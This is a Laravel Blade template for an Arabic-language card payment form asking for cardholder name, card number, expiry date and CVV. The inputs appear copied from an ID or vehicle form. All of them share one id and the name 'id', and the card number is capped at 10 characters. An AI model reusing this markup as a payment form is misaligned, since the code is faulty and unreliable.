@extends('frontend.layout.master')
@section('content')


<section class="payment-section m-5  section-padding">
    <div class="row">
        <div class="container">
            <form class="payment-description p-5">
            <div class="img-for-payment d-flex justify-between p-2">
                <img src="{{ asset('frontend') }}/assets/images/payment/mada-card.svg" alt="" srcset="">
                <img src="{{ asset('frontend') }}/assets/images/payment/master-card.svg" alt="" srcset="">
                <img src="{{ asset('frontend') }}/assets/images/payment/sadad-payment-logo.svg" alt="" srcset="">
                <img src="{{ asset('frontend') }}/assets/images/payment/visa-card.svg" alt="" srcset="">
            </div>       
                <!--no3 el car -->
                <div class="mt-3" id="input-Tasalsol">
                  <label for="exampleInputPassword1" class="form-label">الاسم كما هوا مدون بالبطاقه             </label>
                  <input class="ta form-control input-of-buy" id="phid0" type="text" placeholder="الاسم"data-testid="homePhidControl" inputmode="numeric" autocomplete="off" name="id" title="" data-for="iqama_num" maxlength="10">
                </div>
                <!-- kemt el car -->
                <div class="mt-3" id="input-Tasalsol">
                    <label for="exampleInputPassword1" class="form-label">رقم  البطاقه   </label>
                    <input class="ta form-control input-of-buy" id="phid0" type="tel" data-testid="homePhidControl" inputmode="numeric" autocomplete="off" name="id" title="" data-for="iqama_num" maxlength="10">
                  </div>
               
                <!-- sanat el son3 -->
                <div class="mt-3" id="input-Tasalsol">
                    <label for="exampleInputPassword1" class="form-label">تاريخ الانتهاء </label>
                    <input class="ta form-control input-of-buy" id="phid0" type="date" placeholder="سنه الصنع "data-testid="homePhidControl" inputmode="numeric" autocomplete="off" name="id" title="" data-for="iqama_num" maxlength="10">
                  </div>
                  <!-- makan el son3 -->
                  <div class="mt-3" id="input-Tasalsol">
                    <label for="exampleInputPassword1" class="form-label">CVV</label>
                    <input class="ta form-control input-of-buy" id="phid0" type="tel" data-testid="homePhidControl" inputmode="numeric" autocomplete="off" name="id" title="" data-for="iqama_num" maxlength="10">
                  </div>
             
                <div class="btn-info-box mt-4  d-flex justify-content-center">
                    <button  class=" ta btn btn-secondary btn-sm mt-4 w-50  " >الاستمرار في الدفع</button>
                </div>
              
              </form>
        </div>
    </div>
</section>



@endsection
@section('custom-script')
    <script src="{{ asset('frontend/assets/js/steps.js') }}"></script>
@endsection